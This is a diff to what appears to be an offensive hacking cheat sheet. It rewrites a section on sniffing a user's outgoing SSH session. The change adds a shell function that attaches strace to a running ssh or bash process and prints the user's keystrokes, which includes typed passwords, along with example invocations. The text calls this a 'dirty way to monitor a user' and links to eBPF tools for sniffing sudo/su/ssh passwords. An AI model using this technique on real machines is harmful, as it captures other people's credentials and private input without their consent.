@@ -2050,9 +2050,13 @@ Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://githu
 <a id="ssh-sniffing-strace"></a>
 **10.iv Sniff a user's outgoing SSH session with strace**
 ```sh
-strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
+tit() {
+	strace -e trace=read -p "${1:?}" 2>&1 | stdbuf -oL grep '^read.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+}
+# tit $(pidof -s ssh)
+# tit $(pidof -s bash)
 ```
-Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
+Dirty way to monitor a user who is using *ssh* or their shell to connect to another host from a computer that you control.
 
 
 <a id="ssh-sniffing-wrapper"></a>
